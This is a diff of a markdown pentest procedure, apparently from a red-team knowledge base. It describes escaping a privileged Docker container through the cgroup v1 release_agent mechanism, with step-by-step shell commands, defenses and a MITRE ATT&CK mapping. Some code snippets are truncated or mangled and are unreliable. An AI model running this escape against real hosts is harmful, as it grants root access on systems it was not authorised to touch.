@@ -38,11 +38,15 @@ The objective of this procedure is to exploit a privileged container by abusing 
 
 The business value of this procedure is to demonstrate the importance of securing container environments. By exploiting a privileged container, an attacker can gain access to sensitive data and systems, causing significant damage to the organization.
 
+ 
+
 ## Requirements
 
 1. Access to a Docker host with a privileged container
 
 1. Knowledge of Linux cgroups and SYS_ADMIN capabilities
+
+ 
 
 ## Defense
 
@@ -52,17 +56,27 @@ The business value of this procedure is to demonstrate the importance of securin
 
 1. Use container security tools to detect and prevent privilege escalation
 
+ 
+
 ## Objectives
 
 1. Gain root access on the host system
 
 1. Escalate privileges from within a Docker container
 
+ 
+
 # Instructions
 
 1. Run the following command to start a Docker container with SYS_ADMIN capabilities:
 
+ 
+
+
+
 **Code**: [[docker run --rm -it --cap-add=SYS_ADMIN --security]]
+
+
 
 > - `--rm`: Automatically remove the container when it exits.
 - `-it`: Keep STDIN open and allocate a pseudo-TTY.
@@ -87,24 +101,40 @@ echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 
+ 
+
+
+
 **Code**: [[# On the host
 docker run --rm -it --cap-add=SYS_AD]]
 
+
+
 > This command exploits a vulnerability in Docker's cgroup implementation to gain access to the host system. It allows an attacker to execute arbitrary code on the host system by mounting the cgroup filesystem, creating a new cgroup, and attaching a process to it. Once the cgroup is released, the release_agent script is executed with root privileges, allowing the attacker to execute any command as root. This can be used to gain complete control over the host system.
+
+
 
 **Command** ([[Create and mount a cgroup]]):
 
 ```bash
 mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
-
+ 
 echo 1 > /tmp/cgrp/x/notify_on_release
 ```
+
+
+
+
 
 **Command** ([[Set release agent]]):
 
 ```bash
 echo "$host_path/cmd" > /tmp/cgrp/release_agent
 ```
+
+
+
+
 
 **Command** ([[Create and set command]]):
 
@@ -114,11 +144,17 @@ echo "ps aux > $host_path/output" >> /cmd
 chmod a+x /cmd
 ```
 
+
+
+
+
 **Command** ([[Execute command]]):
 
 ```bash
 sh -c "echo \\\$\\\\$ > /tmp/cgrp/x/cgroup.procs"
 ```
+
+
 
 ## MITRE ATT&CK Mapping
 
@@ -147,3 +183,5 @@ sh -c "echo \\\$\\\\$ > /tmp/cgrp/x/cgroup.procs"
 - [[Abusing CAP_SYS_ADMIN capability]]
 - [[Container - Docker Pentest]]
 - [[Exploit privileged container abusing the Linux cgroup v1]]
+
+
